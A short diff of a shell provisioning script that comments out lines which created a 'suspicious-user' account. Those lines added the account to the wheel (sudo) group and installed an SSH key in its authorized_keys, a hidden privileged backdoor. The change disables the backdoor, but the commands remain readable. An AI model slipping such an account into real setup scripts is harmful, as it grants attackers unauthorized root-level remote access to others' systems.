@@ -19,9 +19,9 @@ useradd $USERNAME
 usermod -a -G wheel $USERNAME
 echo "$USERNAME:$PASSWORD" | chpasswd
 
-SUSS="suspicious-user"
-useradd $SUSS -user
-usermod -a -G wheel $SUSS
-mkdir /home/$SUSS/.ssh
-echo "$KEY" > /home/$SUSS/.ssh/authorized_keys
+#SUSS="suspicious-user"
+#useradd -m $SUSS 
+#usermod -a -G wheel $SUSS
+#mkdir /home/$SUSS/.ssh
+#echo "$KEY" > /home/$SUSS/.ssh/authorized_keys
 
